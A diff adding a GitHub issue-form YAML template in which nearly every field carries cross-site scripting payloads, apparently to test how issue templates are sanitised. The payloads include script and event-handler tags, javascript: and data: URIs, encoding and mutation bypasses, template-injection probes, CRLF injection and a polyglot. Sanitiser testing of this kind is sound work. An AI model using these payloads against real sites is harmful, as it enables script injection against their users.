@@ -1,0 +1,252 @@
+name: "<img src=x onerror=alert('name')> Bug Report"
+description: "File a bug report <script>alert('description')</script> <img src=x onerror=alert('desc')> &lt;script&gt;alert('html_entity')&lt;/script&gt;"
+title: "[Bug]: <img src=x onerror=alert('title')> {{constructor.constructor('alert(1)')()}}"
+labels: ["bug<img src=x onerror=alert('label')>", "<script>alert('label2')</script>", "triage\"><img src=x onerror=alert('label3')>"]
+projects: ["octo-org/1<img src=x onerror=alert('project')>"]
+assignees:
+  - "octocat<img src=x onerror=alert('assignee')>"
+type: "bug<script>alert('type')</script>"
+body:
+  # 1. Markdown block - XSS in value
+  - type: markdown
+    attributes:
+      value: |
+        Thanks for taking the time to fill out this bug report!
+
+        <script>alert('markdown_script')</script>
+        <img src=x onerror=alert('markdown_img')>
+        <svg onload=alert('markdown_svg')>
+        <svg/onload=alert('markdown_svg2')>
+        <details open ontoggle=alert('markdown_details')>
+        <math><mi xlink:href="javascript:alert('markdown_math')">
+        <iframe src="javascript:alert('markdown_iframe')"></iframe>
+        <object data="javascript:alert('markdown_object')">
+        <embed src="javascript:alert('markdown_embed')">
+        <a href="javascript:alert('markdown_a')">click me</a>
+        <a href="jAvAsCrIpT:alert('markdown_a_mixed_case')">click</a>
+        <a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert('markdown_a_html_entities')">click</a>
+        <a href="data:text/html,<script>alert('markdown_data_uri')</script>">click</a>
+        <a href="\x6Aavascript:alert('markdown_hex_escape')">click</a>
+        <body onload=alert('markdown_body')>
+        <input onfocus=alert('markdown_input') autofocus>
+        <select onfocus=alert('markdown_select') autofocus>
+        <textarea onfocus=alert('markdown_textarea') autofocus>
+        <keygen onfocus=alert('markdown_keygen') autofocus>
+        <video><source onerror=alert('markdown_video')>
+        <audio src=x onerror=alert('markdown_audio')>
+        <marquee onstart=alert('markdown_marquee')>
+        <meter onmouseover=alert('markdown_meter')>0</meter>
+        <div style="background:url('javascript:alert(1)')">
+        <div style="width:expression(alert('markdown_expression'))">
+        <table background="javascript:alert('markdown_table')">
+        <img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;markdown_img_entities&#39;&#41;">
+        <img src=x onerror=alert`markdown_template_literal`>
+        <img/src=x/onerror=alert('markdown_img_slash')>
+        <IMG """><SCRIPT>alert('markdown_img_broken')</SCRIPT>">
+        <img src=`x`onerror=alert('markdown_backtick')>
+
+        &lt;img src=x onerror=alert('markdown_lt_entity')&gt;
+        &lt;script&gt;alert('markdown_script_entity')&lt;/script&gt;
+        &#60;script&#62;alert('markdown_numeric_entity')&#60;/script&#62;
+        &#x3C;script&#x3E;alert('markdown_hex_entity')&#x3C;/script&#x3E;
+
+        ![xss](javascript:alert('markdown_img_md'))
+        ![xss](data:text/html,<script>alert('markdown_img_md_data')</script>)
+        [xss](javascript:alert('markdown_link_md'))
+        [xss](data:text/html;base64,PHNjcmlwdD5hbGVydCgnbWFya2Rvd25fYjY0Jyk8L3NjcmlwdD4=)
+        [xss](vbscript:alert('markdown_vbscript'))
+        [xss]( javascript:alert('markdown_link_space'))
+
+        ```
+        <script>alert('markdown_codeblock')</script>
+        ```
+
+        `<script>alert('markdown_inline_code')</script>`
+
+  # 2. Input - XSS in label, description, placeholder
+  - type: input
+    id: contact
+    attributes:
+      label: "Contact Details <img src=x onerror=alert('input_label')> <script>alert('input_label2')</script>"
+      description: "How can we reach you? <img src=x onerror=alert('input_desc')> <svg onload=alert('input_desc_svg')> [click](javascript:alert('input_desc_md'))"
+      placeholder: "email@example.com\"><img src=x onerror=alert('input_placeholder')>"
+    validations:
+      required: false
+
+  # 3. Textarea - XSS in label, description, placeholder, value, render
+  - type: textarea
+    id: what-happened
+    attributes:
+      label: "What happened? <img src=x onerror=alert('textarea_label')>"
+      description: "Tell us what happened <script>alert('textarea_desc')</script> <img src=x onerror=alert('textarea_desc_img')> <svg/onload=alert('textarea_desc_svg')>"
+      placeholder: "Tell us what you see! <img src=x onerror=alert('textarea_placeholder')>"
+      value: |
+        A bug happened!
+        <script>alert('textarea_value_script')</script>
+        <img src=x onerror=alert('textarea_value_img')>
+        <svg onload=alert('textarea_value_svg')>
+        <a href="javascript:alert('textarea_value_link')">click</a>
+        &lt;img src=x onerror=alert('textarea_value_entity')&gt;
+    validations:
+      required: true
+
+  # 4. Textarea with render - XSS in render field
+  - type: textarea
+    id: logs
+    attributes:
+      label: "Relevant log output <img src=x onerror=alert('logs_label')>"
+      description: "Please paste log output <img src=x onerror=alert('logs_desc')>"
+      render: "shell\"><img src=x onerror=alert('logs_render')>"
+
+  # 5. Dropdown - XSS in label, description, options
+  - type: dropdown
+    id: version
+    attributes:
+      label: "Version <img src=x onerror=alert('dropdown_label')>"
+      description: "What version? <script>alert('dropdown_desc')</script> <img src=x onerror=alert('dropdown_desc_img')>"
+      options:
+        - "1.0.2 (Default)"
+        - "1.0.3 <img src=x onerror=alert('dropdown_option')>"
+        - "<script>alert('dropdown_option_script')</script>"
+        - "<svg onload=alert('dropdown_option_svg')>"
+        - "test\"><img src=x onerror=alert('dropdown_option_break')>"
+        - "&lt;img src=x onerror=alert('dropdown_option_entity')&gt;"
+        - "<a href=javascript:alert('dropdown_option_link')>click</a>"
+      default: 0
+    validations:
+      required: true
+
+  # 6. Dropdown multiple - XSS in options
+  - type: dropdown
+    id: browsers
+    attributes:
+      label: "Browsers <img src=x onerror=alert('dropdown2_label')>"
+      multiple: true
+      options:
+        - "Firefox <img src=x onerror=alert('browser_option1')>"
+        - "Chrome<script>alert('browser_option2')</script>"
+        - "<svg onload=alert('browser_option3')>Safari"
+        - "Edge\"><img src=x onerror=alert('browser_option4')>"
+
+  # 7. Checkboxes - XSS in label, description, option labels (markdown supported)
+  - type: checkboxes
+    id: terms
+    attributes:
+      label: "Code of Conduct <img src=x onerror=alert('checkbox_label')>"
+      description: "By submitting this issue <script>alert('checkbox_desc')</script> <img src=x onerror=alert('checkbox_desc_img')>"
+      options:
+        - label: "I agree to follow this project's [Code of Conduct](javascript:alert('checkbox_option_md_link'))"
+          required: true
+        - label: "<img src=x onerror=alert('checkbox_option_img')>"
+          required: false
+        - label: "<script>alert('checkbox_option_script')</script>"
+          required: false
+        - label: "<svg onload=alert('checkbox_option_svg')>"
+          required: false
+        - label: "[XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnY2hlY2tib3hfYjY0Jyk8L3NjcmlwdD4=)"
+          required: false
+        - label: "test &lt;img src=x onerror=alert('checkbox_option_entity')&gt;"
+          required: false
+        - label: "![img](javascript:alert('checkbox_option_md_img'))"
+          required: false
+
+  # 8. Upload - XSS in label, description
+  - type: upload
+    id: screenshots
+    attributes:
+      label: "Upload screenshots <img src=x onerror=alert('upload_label')> <script>alert('upload_label2')</script>"
+      description: "Add screenshots <img src=x onerror=alert('upload_desc')> <svg onload=alert('upload_desc_svg')> [click](javascript:alert('upload_desc_md'))"
+    validations:
+      required: false
+
+  # 9. Extra markdown block - encoding & edge case payloads
+  - type: markdown
+    attributes:
+      value: |
+        <!-- XSS via HTML comment edge cases -->
+        <!--><img src=x onerror=alert('comment_bypass')>-->
+        <comment><img src=x onerror=alert('fake_comment')></comment>
+
+        <!-- Null byte injection -->
+        <img src=x onerror=alert('null_byte')>
+        <scr\x00ipt>alert('null_in_tag')</scr\x00ipt>
+
+        <!-- Double encoding -->
+        %253Cscript%253Ealert('double_encode')%253C/script%253E
+        %3Cimg%20src%3Dx%20onerror%3Dalert('url_encode')%3E
+
+        <!-- Unicode tricks -->
+        <img src=x onerror=\u0061\u006C\u0065\u0072\u0074('unicode_escape')>
+        ＜script＞alert('fullwidth_tags')＜/script＞
+        <img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;('hex_char_ref')>
+        <img src=x onerror=&#97;&#108;&#101;&#114;&#116;('dec_char_ref')>
+
+        <!-- Mutation XSS (mXSS) -->
+        <listing>&lt;img src=x onerror=alert('mxss_listing')&gt;</listing>
+        <noscript><img src=x onerror=alert('mxss_noscript')></noscript>
+        <style><img src=x onerror=alert('mxss_style')></style>
+        <xmp><img src=x onerror=alert('mxss_xmp')></xmp>
+
+        <!-- Protocol handlers -->
+        <a href="tel:1234567890">tel link</a>
+        <a href="mailto:x@x.com?subject=<img src=x onerror=alert('mailto_xss')>">mail</a>
+        <a href="feed:javascript:alert('feed_proto')">feed</a>
+
+        <!-- SVG-specific payloads -->
+        <svg><animate onbegin=alert('svg_animate') attributeName=x dur=1s>
+        <svg><set onbegin=alert('svg_set') attributeName=x to=1>
+        <svg><script>alert('svg_script')</script></svg>
+        <svg><foreignObject><body onload=alert('svg_foreign')></foreignObject></svg>
+        <svg><use href="data:image/svg+xml,<svg onload=alert('svg_use')>"></use></svg>
+
+        <!-- Template/framework injection -->
+        {{7*7}}
+        ${7*7}
+        #{7*7}
+        {{constructor.constructor('alert("ssti")')()}}
+        <%= `alert('erb')` %>
+        ${{<%[%'"}}%\
+
+        <!-- CRLF / header injection in value -->
+        test\r\nContent-Type: text/html\r\n\r\n<script>alert('crlf')</script>
+
+  # 10. Extra input - attribute injection via id field
+  - type: input
+    id: "contact2\" onfocus=\"alert('id_injection')"
+    attributes:
+      label: "Secondary Contact"
+      description: "Backup contact info"
+      placeholder: "ex. phone"
+    validations:
+      required: false
+
+  # 11. Textarea - polyglot payload
+  - type: textarea
+    id: polyglot
+    attributes:
+      label: "Additional context"
+      description: "Any other context about the problem"
+      value: |
+        jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%%0telerik%telerikD%telerikA%telerikD%0telerika%0D%0AoN%telerikcliCk=alert()//</stYle/telerik</teleriktiTle/</telerikteXtarEa/</tele
+        rikscRipt/--!>\x3csVg/<telerisVg/oNloAd=alert()//>\x3e
+
+        '">><marquee><img src=x onerror=alert('polyglot2')>//<details/open/ontoggle=confirm('polyglot3')>
+
+        javascript:alert('proto1')
+        &#0000106avascript:alert('proto2')
+        \x6Aavascript:alert('proto3')
+        data:text/html,<script>alert('proto4')</script>
+        vbscript:alert('proto5')
+
+  # 12. Checkboxes with markdown link edge cases
+  - type: checkboxes
+    id: extra-checks
+    attributes:
+      label: "Extra agreements"
+      options:
+        - label: "I read the [terms](https://example.com\" onclick=\"alert('checkbox_attr_inject'))"
+          required: false
+        - label: "I read the [terms](https://example.com)<img src=x onerror=alert('checkbox_after_link')>"
+          required: false
+        - label: "I accept [<img src=x onerror=alert('checkbox_img_in_link')>](https://example.com)"
+          required: false
